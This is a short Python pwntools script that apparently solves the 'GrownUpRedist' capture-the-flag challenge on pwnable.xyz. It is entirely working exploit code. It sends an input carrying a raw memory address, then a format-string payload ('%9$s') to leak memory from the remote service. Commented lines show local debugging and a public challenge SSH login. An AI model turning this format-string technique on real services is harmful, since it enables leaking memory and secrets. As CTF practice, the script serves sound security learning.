#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./GrownUpRedist", checksec = False)

#con = process()
# gdb.attach(con, gdbscript = "b*0x4008b8")

#sh = ssh(host='pwnable.kr',user='passcode',port=2222,password='guest')
#con = sh.process("path")

con = remote("svc.pwnable.xyz", 30004)

input()
con.sendlineafter(b"older? [y/N]: ", b"yaaaaaaa\x80\x10\x60")
payload = b"A"*32 + b"%9$s"
payload = payload.ljust(128, b"B")
con.sendlineafter(b"Name: ", payload)

con.interactive()
